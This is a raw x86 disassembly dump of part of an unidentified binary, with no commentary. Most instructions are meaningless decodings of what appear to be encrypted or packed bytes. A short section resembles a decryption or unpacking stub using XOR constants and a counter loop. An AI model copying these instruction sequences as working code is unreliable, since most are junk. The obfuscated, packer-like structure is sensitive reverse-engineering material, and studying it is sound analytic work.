  4087fb:	jo     0x4087b4
  4087fd:	xor    eax,0xd5954c16
  408802:	lahf   
  408803:	adc    DWORD PTR [eax],edx
  408805:	scas   al,BYTE PTR es:[edi]
  408806:	cdq    
  408807:	sti    
  408808:	push   ebx
  408809:	aad    0x10
  40880b:	sbb    BYTE PTR [edi-0x27],ch
  40880e:	imul   ecx,DWORD PTR [eax+0x25a2154a],0xfd86fe69
  408818:	sbb    bl,BYTE PTR [ecx-0x25857fe0]
  40881e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40881f:	push   0x304b4aee
  408824:	lock sbb dh,BYTE PTR [ebx-0x42cbd2ac]
  40882b:	in     eax,dx
  40882c:	shr    edx,cl
  40882e:	jle    0x4087fd
  408830:	adc    BYTE PTR [ebx+0x6563659d],dl
  408836:	out    0x38,eax
  408838:	test   al,0xb3
  40883a:	sti    
  40883b:	jl     0x408878
  40883d:	mov    BYTE PTR [ebp-0x157497f3],dh
  408843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408844:	scas   al,BYTE PTR es:[edi]
  408845:	jbe    0x4088bd
  408847:	push   0x8ad3fa47
  40884c:	xor    DWORD PTR [ebx],0xf36377e1
  408852:	push   di
  408854:	mov    BYTE PTR [edi+0x14a7b299],dh
  40885a:	in     al,0xa7
  40885c:	pop    ds
  40885d:	das    
  40885e:	cwde   
  40885f:	mov    al,ds:0x148fc536
  408864:	(bad)  
  408865:	repnz push esp
  408867:	(bad)
  40886a:	int3   
  40886b:	xchg   esp,eax
  40886c:	ja     0x408877
  40886e:	lods   al,BYTE PTR ds:[esi]
  40886f:	xlat   BYTE PTR ds:[ebx]
  408870:	add    edx,eax
  408872:	popf   
  408873:	ud1    esi,DWORD PTR ds:0xeb71dd7c
  40887a:	paddb  mm1,QWORD PTR [eax]
  40887d:	test   al,0x72
  40887f:	shr    bh,1
  408881:	repz mov ch,0x8b
  408884:	and    eax,0x365d159
  408889:	jno    0x408859
  40888b:	push   edx
  40888c:	jbe    0x408850
  40888e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40888f:	adc    BYTE PTR [esi+0x701e8890],cl
  408895:	xchg   edx,eax
  408896:	inc    esi
  408897:	xor    ebp,ecx
  408899:	push   ebx
  40889a:	mov    al,ds:0x5b92a4b
  40889f:	and    BYTE PTR [esi],ch
  4088a1:	sbb    edx,DWORD PTR [esi]
  4088a3:	sbb    al,0x5a
  4088a5:	and    eax,0x643c074e
  4088aa:	mov    al,ds:0x8aa9eaff
  4088af:	cmp    eax,0x81653a88
  4088b4:	jecxz  0x40887b
  4088b6:	ret    0xeefc
  4088b9:	mov    ecx,0xf686b2f8
  4088be:	jg     0x4088a8
  4088c0:	adc    BYTE PTR [edx],0x8d
  4088c3:	push   es
  4088c4:	xor    al,0x47
  4088c6:	add    BYTE PTR [eax],ah
  4088c8:	xchg   ebx,eax
  4088c9:	mov    esi,0x645a8bf2
  4088ce:	jnp    0x408853
  4088d0:	jp     0x40892d
  4088d2:	adc    eax,edx
  4088d4:	inc    eax
  4088d5:	outs   dx,BYTE PTR ds:[esi]
  4088d6:	xchg   ebx,eax
  4088d7:	pusha  
  4088d8:	mov    bl,0x4d
  4088da:	adc    eax,0x8a3b87ed
  4088df:	adc    BYTE PTR [ebp-0x58],cl
  4088e2:	mov    ebp,0x8e449c3b
  4088e7:	fiadd  DWORD PTR [edx]
  4088e9:	ror    DWORD PTR [ebp+0x1f],0x2b
  4088ed:	mov    esp,DWORD PTR [edi]
  4088ef:	add    DWORD PTR [esi+0x3f],ecx
  4088f2:	jae    0x40891d
  4088f4:	inc    edi
  4088f5:	fstp   DWORD PTR [eax+0xe7599f7]
  4088fb:	fwait
  4088fc:	cli    
  4088fd:	adc    esp,DWORD PTR [ecx+0x3c]
  408900:	fdivr  QWORD PTR [ecx]
  408902:	inc    edi
  408903:	sub    DWORD PTR [ecx+eax*4+0x62c7eb48],0x5beca19e
  40890e:	push   0x5f
  408910:	(bad)  
  408911:	push   edx
  408912:	push   cs
  408913:	adc    eax,DWORD PTR [ebp-0x6781ea7c]
  408919:	mov    ebp,0xee6eeee9
  40891e:	xor    ebp,DWORD PTR [ebx-0x54]
  408921:	push   edx
  408922:	sar    DWORD PTR [esi],1
  408924:	push   ss
  408925:	jns    0x4089a3
  408927:	jno    0x408902
  408929:	inc    ecx
  40892a:	in     eax,0xab
  40892c:	sbb    ch,BYTE PTR [edx]
  40892e:	leave  
  40892f:	xor    eax,0x24317c20
  408934:	cmp    dh,ch
  408936:	fst    QWORD PTR [ecx+0x65]
  408939:	cli    
  40893a:	push   ebp
  40893b:	cs out 0x2a,al
  40893e:	imul   esi,ecx,0xffffffce
  408941:	push   ds
  408942:	inc    esp
  408943:	call   0x550818f4
  408948:	dec    edx
  408949:	pop    esp
  40894a:	popf   
  40894b:	xchg   ebp,eax
  40894c:	ins    DWORD PTR es:[edi],dx
  40894d:	les    eax,FWORD PTR [esi]
  40894f:	in     al,0xf8
  408951:	adc    esp,DWORD PTR [edi+0x131ed1bd]
  408957:	pop    esp
  408958:	ins    BYTE PTR es:[edi],dx
  408959:	jmp    0x4089be
  40895b:	dec    edx
  40895c:	data16 sub bl,0x3a
  408960:	pop    ds
  408961:	xor    al,0xdd
  408963:	fwait
  408964:	and    DWORD PTR [eax-0x1a128208],eax
  40896a:	test   BYTE PTR [esi+0x6d],bh
  40896d:	clc    
  40896e:	adc    BYTE PTR [esi+0x5c],ah
  408971:	imul   eax,DWORD PTR ds:0x478c1b95,0x61c64c3c
  40897b:	xor    DWORD PTR [eax+eiz*2],ebp
  40897e:	imul   esp,DWORD PTR [ecx+ebx*8-0x1e],0x3f
  408983:	ja     0x408997
  408985:	jne    0x40890d
  408987:	les    esp,FWORD PTR [edi+ecx*4-0x41]
  40898b:	in     eax,dx
  40898c:	dec    eax
  40898d:	inc    dl
  40898f:	mov    ch,0xe2
  408991:	mov    ecx,DWORD PTR [edi]
  408993:	sbb    al,0xc8
  408995:	lods   al,BYTE PTR ds:[esi]
  408996:	je     0x40896f
  408998:	or     BYTE PTR [esi-0x47accd70],dh
  40899e:	lea    ecx,[edx]
  4089a0:	mov    bl,0xc4
  4089a2:	mov    ebp,DWORD PTR [edx+0x54d36148]
  4089a8:	je     0x40899d
  4089aa:	mov    al,0xc9
  4089ac:	or     DWORD PTR [esi],ebp
  4089ae:	iret   
  4089af:	jmp    0x408a02
  4089b1:	pusha  
  4089b2:	mov    dl,0x3e
  4089b4:	fsubr  QWORD PTR [edx]
  4089b6:	ror    DWORD PTR [edx-0x5d],cl
  4089b9:	add    eax,0x4d44ca79
  4089be:	or     bl,dh
  4089c0:	push   ebx
  4089c1:	wrmsr  
  4089c3:	sbb    edx,eax
  4089c5:	fcom   QWORD PTR ds:0xa7ab2dd6
  4089cb:	aas    
  4089cc:	xchg   bh,ch
  4089ce:	jmp    0x1cc0f2c0
  4089d3:	xor    al,0x74
  4089d5:	dec    eax
  4089d6:	xor    eax,0x3719e7e3
  4089db:	add    DWORD PTR [esi],ecx
  4089dd:	pop    edi
  4089de:	imul   edi,esi,0x4ef516ff
  4089e4:	scas   al,BYTE PTR es:[edi]
  4089e5:	and    bl,ch
  4089e7:	out    0xb2,al
  4089e9:	pop    eax
  4089ea:	xor    bl,bh
  4089ec:	dec    ebp
  4089ed:	scas   al,BYTE PTR es:[edi]
  4089ee:	daa    
  4089ef:	out    dx,eax
  4089f0:	sbb    DWORD PTR [esp+ebx*8],0x57fb9ac6
  4089f7:	mov    edi,0xf8e2bf26
  4089fc:	fmul   st(6),st
  4089fe:	push   eax
  4089ff:	sbb    BYTE PTR [ebx+esi*4],0xe8
  408a03:	jmp    0x4089df
  408a05:	scas   eax,DWORD PTR es:[edi]
  408a06:	shr    DWORD PTR [ecx],1
  408a08:	pushf  
  408a09:	out    0x69,al
  408a0b:	jle    0x408a86
  408a0d:	bound  ebp,QWORD PTR [edi-0x351239d]
  408a13:	neg    al
  408a15:	and    edi,0xd9ad852c
  408a1b:	push   es
  408a1c:	out    0x38,eax
  408a1e:	jmp    0x1555:0xc12763d3
  408a25:	test   dl,ah
  408a27:	dec    eax
  408a28:	xor    eax,0xb92f6019
  408a2d:	inc    eax
  408a2e:	adc    al,0xd0
  408a30:	xchg   dx,ax
  408a32:	inc    esi
  408a33:	aam    0x2b
  408a35:	pop    ebp
  408a36:	pop    edx
  408a37:	and    DWORD PTR [edi-0xb],edx
  408a3a:	add    al,0xf8
  408a3c:	sti    
  408a3d:	xor    dl,BYTE PTR [edx+0x20cae201]
  408a43:	pop    ebp
  408a44:	cmp    eax,0x93dda908
  408a49:	cmp    ebx,esp
  408a4b:	xor    ebx,DWORD PTR [ecx+edx*1]
  408a4e:	dec    edi
  408a4f:	clc    
  408a50:	xor    dl,BYTE PTR [edx-0x25]
  408a53:	push   cs
  408a54:	(bad)  
  408a55:	fwait
  408a56:	push   edi
  408a57:	ins    BYTE PTR es:[edi],dx
  408a58:	mov    BYTE PTR [ebx],bh
  408a5a:	pop    ebx
  408a5b:	inc    ebx
  408a5c:	or     al,0x2f
  408a5e:	icebp  
  408a5f:	jmp    0xa4f48652
  408a64:	xor    eax,0x131bd201
  408a69:	js     0x408a20
  408a6b:	push   esi
  408a6c:	dec    esp
  408a6d:	jb     0x408ad4
  408a6f:	mov    DWORD PTR [ecx],eax
  408a71:	pop    esi
  408a72:	leave  
  408a73:	ret    0xc
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0xd2b3a4f9
  408a92:	(bad)  
  408a93:	xor    dh,BYTE PTR [edi]
  408a95:	cmp    ah,ah
  408a97:	js     0x408b11
  408a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a9a:	jle    0x408b14
  408a9c:	js     0x408a28
  408a9e:	and    BYTE PTR [edx-0x4224c2c3],al
  408aa4:	out    dx,al
  408aa5:	and    al,0xb6
  408aa7:	ins    DWORD PTR es:[edi],dx
  408aa8:	xor    cl,dl
  408aaa:	std    
  408aab:	int    0xeb
  408aad:	mov    edx,0xe9cc97e5
  408ab2:	mov    ebp,0x525b9731
  408ab7:	pop    ebx
  408ab8:	scas   eax,DWORD PTR es:[edi]
  408ab9:	xlat   BYTE PTR ds:[ebx]
  408aba:	stos   DWORD PTR es:[edi],eax
  408abb:	push   ss
  408abc:	shl    BYTE PTR [edi-0x55],1
  408abf:	cdq    
  408ac0:	mov    ds,WORD PTR [ebx-0x1]
  408ac3:	repz out dx,al
  408ac5:	ret    
  408ac6:	enter  0x1ce2,0x31
  408aca:	xor    BYTE PTR [edi-0x5a315ca],bh
  408ad0:	pop    ebx
  408ad1:	ja     0x408aec
  408ad3:	aas    
  408ad4:	pop    ds
  408ad5:	mov    esi,0xd95aadda
  408ada:	push   0x565703d
  408adf:	mov    bl,0xe9
  408ae1:	adc    BYTE PTR [esi+0x2],bh
  408ae4:	xchg   edx,eax
  408ae5:	stos   BYTE PTR es:[edi],al
  408ae6:	ja     0x408b14
  408ae8:	in     al,dx
  408ae9:	mov    ds,esi
  408aeb:	push   0xffffffea
  408aed:	lods   eax,DWORD PTR ds:[esi]
  408aee:	xor    al,0xe2
  408af0:	xor    al,0xa7
  408af2:	dec    esp
  408af3:	mov    DWORD PTR [ebx+ebx*8+0x579b6a5e],esp
  408afa:	movd   mm6,DWORD PTR [esi+0x47e4f9bb]
  408b01:	add    BYTE PTR [edi+0x26],dl
  408b04:	mov    ch,0x46
  408b06:	adc    esp,esp
  408b08:	fadd   DWORD PTR [ebx+0x56]
  408b0b:	mov    dl,0xd1
  408b0d:	pop    ebx
  408b0e:	mov    bl,0x5f
  408b10:	jg     0x408b3c
  408b12:	outs   dx,DWORD PTR ds:[esi]
  408b13:	stc    
  408b14:	scas   al,BYTE PTR es:[edi]
  408b15:	cli    
  408b16:	fwait
  408b17:	pop    ecx
  408b18:	pushf  
  408b19:	in     eax,dx
  408b1a:	jle    0x408b2f
  408b1c:	cld    
  408b1d:	pop    eax
  408b1e:	mov    ds:0xce6623f1,al
  408b23:	cmp    al,0x68
  408b25:	std    
  408b26:	ds jns 0x408b78
  408b29:	push   0xad705b85
  408b2e:	rcl    DWORD PTR [ebx+0x1b],0x7d
  408b32:	loop   0x408b56
  408b34:	out    dx,eax
  408b35:	loope  0x408ba2
  408b37:	mov    edx,0xa77df567
  408b3c:	cdq    
  408b3d:	out    dx,eax
  408b3e:	in     al,dx
  408b3f:	scas   al,BYTE PTR es:[edi]
  408b40:	push   0xffffffaa
  408b42:	push   ebx
  408b43:	and    DWORD PTR [edx],edx
  408b45:	in     eax,0xc9
  408b47:	test   DWORD PTR [ebp+0x381e4b96],edx
  408b4d:	jne    0x408adf
  408b4f:	int3   
  408b50:	dec    esp
  408b51:	(bad)  
  408b52:	out    0x47,al
  408b54:	sub    eax,0x703925bb
  408b59:	popa   
  408b5a:	pushf  
  408b5b:	sub    dl,BYTE PTR [eax+eax*8+0x72]
  408b5f:	mov    eax,DWORD PTR [esi]
  408b61:	xlat   BYTE PTR ds:[ebx]
  408b62:	push   esp
  408b63:	imul   edx,DWORD PTR [edi+0x52633173],0x64
  408b6a:	scas   eax,DWORD PTR es:[edi]
  408b6b:	out    dx,eax
  408b6c:	sub    DWORD PTR [edi],0x57
  408b6f:	(bad)  
  408b70:	mov    eax,ds:0x5711ae81
  408b75:	and    DWORD PTR [eax-0x59],0xffffffbe
  408b79:	push   ss
  408b7a:	sub    al,0xe9
  408b7c:	xchg   edi,eax
  408b7d:	adc    al,bl
  408b7f:	call   0xcac55f6f
  408b84:	outs   dx,BYTE PTR ds:[esi]
  408b85:	outs   dx,DWORD PTR ds:[esi]
  408b86:	or     al,BYTE PTR [edi-0x5e]
  408b89:	pop    edi
  408b8a:	mov    DWORD PTR ds:[ecx-0x63],ebp
  408b8e:	push   edi
  408b8f:	cli    
  408b90:	pop    esi
  408b91:	mov    ah,0x36
  408b93:	mov    eax,ds:0x9fbd37cd
  408b98:	sbb    edi,ecx
  408b9a:	pushf  
  408b9b:	mov    ebp,0xa789bb7
  408ba0:	popa   
  408ba1:	adc    eax,0x2cc46be4
  408ba6:	lods   eax,DWORD PTR ds:[esi]
  408ba7:	fsubrp st(4),st
  408ba9:	jns    0x408b61
  408bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bac:	push   edx
  408bad:	(bad)  
  408bae:	xor    al,cl
  408bb0:	sub    DWORD PTR [ebx+0x7b],eax
  408bb3:	jb     0x408c04
  408bb5:	adc    ch,BYTE PTR [edx-0x33]
  408bb8:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  408bba:	jno    0x408bc5
  408bbc:	dec    eax
  408bbd:	dec    ebp
  408bbe:	scas   al,BYTE PTR es:[edi]
  408bbf:	mov    esi,0x48d1e64c
  408bc4:	add    eax,0xcc559771
  408bc9:	outs   dx,BYTE PTR ds:[esi]
  408bca:	xor    DWORD PTR [ebx-0x7a9e1900],ecx
  408bd0:	fst    QWORD PTR [edx-0x41]
  408bd3:	int    0xeb
  408bd5:	ficomp WORD PTR [ecx-0x52]
  408bd8:	push   eax
  408bd9:	out    0x33,eax
  408bdb:	out    0x7f,al
  408bdd:	add    DWORD PTR [ebx],0x2e
  408be0:	cwde   
  408be1:	cmp    edx,DWORD PTR [esi+ecx*1+0x73beef83]
  408be8:	into   
  408be9:	mov    edx,0x70f1c0d7
  408bee:	cwde   
  408bef:	inc    esi
  408bf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bf1:	cmp    eax,0x25de0904
  408bf6:	cld    
  408bf7:	in     eax,dx
  408bf8:	or     cl,BYTE PTR [ebx+0x22a0ff71]
  408bfe:	scas   al,BYTE PTR es:[edi]
  408bff:	in     eax,dx
  408c00:	ja     0x408bd1
  408c02:	sar    DWORD PTR [eax-0x50],1
  408c05:	add    bh,BYTE PTR [edx-0x37]
  408c08:	sar    esi,1
  408c0a:	iret   
  408c0b:	jae    0x408ba4
  408c0d:	fdivr  DWORD PTR [edi-0x61f6b5ab]
  408c13:	mul    bh
  408c15:	pop    ss
  408c16:	in     eax,0x8f
  408c18:	mov    esi,0xe329196
  408c1d:	test   BYTE PTR [edx+0x59],al
  408c20:	sub    eax,0x14ef91cb
  408c25:	push   bp
  408c27:	cmp    DWORD PTR [eax],edi
  408c29:	pushf  
  408c2a:	aad    0x2c
  408c2c:	push   ecx
  408c2d:	ins    DWORD PTR es:[edi],dx
  408c2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c2f:	dec    edx
  408c30:	and    eax,0x56cda793
  408c35:	sbb    BYTE PTR [esi-0x4a8aa964],cl
  408c3b:	cmp    DWORD PTR [eax+ecx*8-0x7ddc1011],edx
  408c42:	xlat   BYTE PTR ds:[ebx]
  408c43:	sub    al,bl
  408c45:	adc    ah,BYTE PTR [edx-0x2f]
  408c48:	push   esi
  408c49:	(bad)  [edx+0x7bf22483]
  408c4f:	push   ecx
  408c50:	test   eax,0xe99853e0
  408c55:	ja     0x408bfb
  408c57:	ja     0x408c70
  408c59:	xchg   ecx,eax
  408c5a:	mov    esi,0x1e2aadc3
  408c5f:	gs mov dl,bh
  408c62:	or     esp,DWORD PTR [ebp+0x6a]
  408c65:	adc    esp,DWORD PTR [ecx+esi*2]
  408c68:	les    esi,FWORD PTR [eax-0x28f1225f]
  408c6e:	or     DWORD PTR [ebp-0x60a43e7c],0xc
  408c75:	or     cl,al
  408c77:	gs aad 0xe4
  408c7a:	inc    ebp
  408c7b:	mov    eax,ds:0x83ee28fc
  408c80:	(bad)  
  408c81:	out    dx,eax
  408c82:	(bad)  
  408c83:	jge    0x408c76
  408c85:	xor    eax,0x84304a16
  408c8a:	or     cl,al
  408c8c:	sbb    al,0xd7
  408c8e:	sub    ebp,DWORD PTR [edi-0x5f]
  408c91:	mov    dl,0x67
  408c93:	cwde   
  408c94:	push   edx
  408c95:	jns    0x408c87
  408c97:	push   eax
  408c98:	dec    edi
  408c99:	and    eax,0x75016b12
  408c9e:	repz and eax,0x60487424
  408ca4:	lds    ebx,FWORD PTR [edx-0x65cddc69]
  408caa:	sub    al,0x47
  408cac:	xor    al,0x20
  408cae:	mov    cl,0xdd
  408cb0:	xchg   esi,eax
  408cb1:	dec    ebx
  408cb2:	or     esp,edx
  408cb4:	adc    esi,esi
  408cb6:	jle    0x408c7b
  408cb8:	daa    
  408cb9:	cdq    
  408cba:	icebp  
  408cbb:	mov    al,0x3a
  408cbd:	cmp    cl,BYTE PTR [esi-0x2db9a277]
  408cc3:	sub    al,0xe0
  408cc5:	sub    eax,0x1de5414a
  408cca:	add    dh,BYTE PTR [edx-0x17]
  408ccd:	jle    0x408ccd
  408ccf:	and    bh,BYTE PTR [edi+0x1d]
  408cd2:	ret    0xa7c2
  408cd5:	pop    edi
  408cd6:	mov    eax,ds:0x4dcde357
  408cdb:	sbb    BYTE PTR [ebx+0x64a45124],0xd5
  408ce2:	(bad)  
  408ce4:	jns    0x408cb6
  408ce6:	fst    DWORD PTR [ebx-0x696970c]
  408cec:	and    al,0x6c
  408cee:	mov    DWORD PTR [eax-0xcf7c3ac],0x4ce75375
  408cf8:	mov    ch,0xf1
  408cfa:	in     al,dx
  408cfb:	cwde   
  408cfc:	jo     0x408d2d
  408cfe:	jmp    0x124e:0x1fb7192b
  408d05:	mov    edi,0xb9204b3f
  408d0a:	xchg   edi,eax
  408d0b:	xchg   ecx,eax
  408d0c:	adc    eax,0x3bf93ce2
  408d11:	xlat   BYTE PTR ds:[ebx]
  408d12:	lock test al,0x76
  408d15:	pushf  
  408d16:	or     ebp,0x17f8f4fd
  408d1c:	xor    eax,0x72b38daf
  408d21:	lea    ebx,[esi-0x34]
  408d24:	xchg   esi,eax
  408d25:	sub    al,0x0
  408d28:	stos   BYTE PTR es:[edi],al
  408d29:	out    0x1e,eax
  408d2b:	inc    esi
  408d2c:	out    dx,al
  408d2d:	jnp    0x408d20
  408d2f:	sbb    bl,BYTE PTR [edx]
  408d31:	stc    
  408d32:	dec    ebx
  408d33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d34:	mov    ch,0x24
  408d36:	mov    eax,0x1529fc0a
  408d3b:	xor    ebp,eax
  408d3d:	or     DWORD PTR ds:0x649bad35,esp
  408d43:	mov    BYTE PTR [esi-0x7ba383a],dl
  408d49:	cmp    BYTE PTR [ebp+0x45c7f89c],al
  408d4f:	cld    
  408d50:	cmp    DWORD PTR [ebp+0x458bf89c],eax
  408d56:	cld    
  408d57:	add    edx,edx
  408d59:	push   esi
  408d5a:	mov    edx,DWORD PTR ds:0x42a86d
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42a88d,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42a7c1,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42a7c1
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42a7c1,ecx
  408d90:	cmp    DWORD PTR ds:0x42a7c1,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42a7c1,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42a7c1,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42a7c1
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42a7c1,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42a7f5
  408ddc:	xor    ecx,DWORD PTR ds:0x42a7bd
  408de2:	mov    DWORD PTR ds:0x42a7f5,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42a809,0x42a765
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42a77d,0x42a7f9
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0xffffffc6
  408e1d:	cmp    al,BYTE PTR [esp+eax*4+0x67]
  408e21:	jmp    0x7878:0x7ea77878
  408e28:	push   0x5c945b13
  408e2d:	pop    edx
  408e2e:	ret    
  408e2f:	loopne 0x408e6d
  408e31:	sbb    BYTE PTR [ebx],bh
  408e33:	in     al,dx
  408e34:	arpl   WORD PTR [eax+0x231c061f],di
  408e3a:	or     ch,BYTE PTR [eax-0x365447c9]
  408e40:	sub    esi,edx
  408e42:	pop    eax
  408e43:	jecxz  0x408e8f
  408e45:	ja     0x408e70
  408e47:	fmul   QWORD PTR [ebx+0x6d60efea]
  408e4d:	ds lahf 
  408e4f:	jae    0x408de1
  408e51:	dec    ebp
  408e52:	aad    0x27
  408e54:	ror    BYTE PTR [eax+0x28],cl
  408e57:	jns    0x408eb4
  408e59:	sbb    ecx,ebp
  408e5b:	adc    dl,BYTE PTR [ebx+0x13]
  408e5e:	call   0x4565:0x1fae5eb7
  408e65:	aaa    
  408e66:	lds    ecx,FWORD PTR [ecx]
  408e68:	mov    bh,0x91
  408e6a:	rcl    dl,cl
  408e6c:	fst    st(3)
  408e6e:	lds    esp,FWORD PTR [eax+0x63]
  408e71:	mov    al,0x3e
  408e73:	fld    DWORD PTR [ebx+0x6f310b2d]
  408e79:	paddq  mm4,QWORD PTR [esi]
  408e7c:	popf   
  408e7d:	pop    ds
  408e7e:	scas   al,BYTE PTR es:[edi]
  408e7f:	(bad)  
  408e80:	fmul   QWORD PTR [eax+0x7dfcd9fb]
  408e86:	pop    es
  408e87:	mov    eax,0xdba0d2ef
  408e8c:	ins    BYTE PTR es:[edi],dx
  408e8d:	test   dl,ah
  408e8f:	test   eax,0x9dc3d36d
  408e94:	fucom  st(0)
  408e96:	cmp    DWORD PTR [ecx+edx*4-0x56],esi
  408e9a:	retf   
  408e9b:	aaa    
  408e9c:	xor    dh,BYTE PTR [edi-0x58]
  408e9f:	shr    BYTE PTR [ebx],cl
  408ea1:	call   0x97b3:0xeee47ff1
  408ea8:	dec    edx
  408ea9:	mov    ds:0x456d5081,al
  408eae:	cmp    DWORD PTR [edx],esi
  408eb0:	loopne 0x408e4b
  408eb2:	fisttp WORD PTR [edi-0x36]
  408eb5:	add    BYTE PTR [eax-0x2d831fa7],dl
  408ebb:	retf   
  408ebc:	leave  
  408ebd:	shl    DWORD PTR [esi-0x39],cl
  408ec0:	pop    ebp
  408ec1:	mov    BYTE PTR [eax],ah
  408ec3:	out    dx,eax
  408ec4:	sub    eax,0xb95e22b3
  408ec9:	jb     0x408f36
  408ecb:	lahf   
  408ecc:	test   al,0x95
  408ece:	aas    
  408ecf:	sub    al,0x81
  408ed1:	jns    0x408f25
  408ed3:	mov    WORD PTR [ebp+0x33],es
  408ed6:	cwde   
  408ed7:	xor    dh,BYTE PTR [edx-0x63]
  408eda:	cld    
  408edb:	sar    BYTE PTR [ebx],0x27
  408ede:	inc    eax
  408edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ee0:	xor    BYTE PTR [esi],ch
  408ee2:	jae    0x408eba
  408ee4:	dec    ebp
  408ee5:	in     eax,0x83
  408ee7:	inc    ebp
  408ee8:	pop    edi
  408ee9:	loopne 0x408ede
  408eeb:	and    DWORD PTR [edi+0x13449f1b],esp
  408ef1:	inc    esi
  408ef2:	iret   
  408ef3:	leave  
  408ef4:	out    dx,eax
  408ef5:	cdq    
  408ef6:	imul   eax,DWORD PTR [ecx-0x41a9085a],0x5d3ccadd
  408f00:	hlt    
  408f01:	shl    BYTE PTR [edx+0x2b],1
  408f04:	mov    ebx,0x31ed90f
  408f09:	adc    al,0x70
  408f0b:	dec    edi
  408f0c:	out    0x2,eax
  408f0e:	pop    ds
  408f0f:	out    dx,eax
  408f10:	push   ebp
  408f11:	rcl    edi,cl
  408f13:	sub    eax,0xbffb5a4b
  408f18:	jecxz  0x408f71
  408f1a:	jno    0x408f31
  408f1c:	push   cs
  408f1d:	bound  esp,QWORD PTR [ebp-0x61]
  408f20:	daa    
  408f21:	enter  0xde09,0x37
  408f25:	loop   0x408f9a
  408f27:	xchg   DWORD PTR ds:0x176dbfe4,edx
  408f2d:	adc    edx,edi
  408f2f:	xor    al,0x1d
  408f31:	icebp  
  408f32:	add    ecx,ebp
  408f34:	jecxz  0x408ee0
  408f36:	adc    ebp,DWORD PTR [ecx-0x5b0bf11a]
  408f3c:	test   BYTE PTR [ebx-0x2a121ea8],cl
  408f42:	sbb    DWORD PTR [edi-0x600239af],edx
  408f48:	xchg   BYTE PTR [eax],al
  408f4a:	dec    esi
  408f4b:	scas   eax,DWORD PTR es:[edi]
  408f4c:	xor    eax,0xe6986972
  408f51:	and    DWORD PTR [esi],edi
  408f53:	push   ecx
  408f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f55:	jge    0x408edc
  408f57:	cli    
  408f58:	jge    0x408f28
  408f5a:	inc    eax
  408f5b:	daa    
  408f5c:	xchg   edx,eax
  408f5d:	daa    
  408f5e:	clc    
  408f5f:	xor    al,al
  408f61:	xor    eax,0xeb1acd3d
  408f66:	cmp    cl,BYTE PTR [ebx+0x2d]
  408f69:	push   ebp
  408f6a:	in     eax,0xc8
  408f6c:	push   ss
  408f6d:	and    BYTE PTR [esi],dh
  408f6f:	pop    eax
  408f70:	adc    DWORD PTR [edx+0x2d],ebp
  408f73:	jmp    0x3182:0x7d8f82cd
  408f7a:	neg    DWORD PTR [eax+0x2bb061d7]
  408f80:	bound  ecx,QWORD PTR [esi+edx*8+0x41]
  408f84:	jmp    0x3bd9:0xd1ed249c
  408f8b:	pop    edx
  408f8c:	nop
  408f8d:	call   0x6d6e3232
  408f92:	mov    edi,0xea079031
  408f97:	lds    edx,FWORD PTR [eax+0x4c]
  408f9a:	test   eax,0xd2339f25
  408f9f:	pop    edi
  408fa0:	inc    edi
  408fa1:	inc    esi
  408fa2:	cs loop 0x408f92
  408fa5:	xchg   ecx,eax
  408fa6:	ror    DWORD PTR [edi],cl
  408fa8:	and    bl,BYTE PTR [ebp-0x69]
  408fab:	lock lods eax,DWORD PTR ds:[esi]
  408fad:	fmul   QWORD PTR [edx+eax*8+0x74acc708]
  408fb4:	sbb    BYTE PTR [edx+0x45],dh
  408fb7:	xor    BYTE PTR [ecx-0x3cf765bf],dh
  408fbd:	xchg   ebx,eax
  408fbe:	daa    
  408fbf:	loopne 0x409018
  408fc1:	mov    al,ds:0x5f837522
  408fc6:	jb     0x408f62
  408fc8:	ds pop edx
  408fca:	ds jle 0x408ff0
  408fcd:	mov    esp,DWORD PTR [eax-0x2df22bb6]
  408fd3:	cdq    
  408fd4:	or     al,0xd8
  408fd6:	ficomp DWORD PTR [edx+0x7af60fd9]
  408fdc:	lods   al,BYTE PTR ds:[esi]
  408fdd:	(bad)  
  408fde:	mov    DWORD PTR [esp+esi*1+0x3b73d201],ebx
  408fe5:	add    BYTE PTR [esi-0x32cec3f4],bl
  408feb:	adc    eax,0x5e2ec876
  408ff0:	mov    al,ds:0xaf804e3b
  408ff5:	sub    eax,0x502d26e5
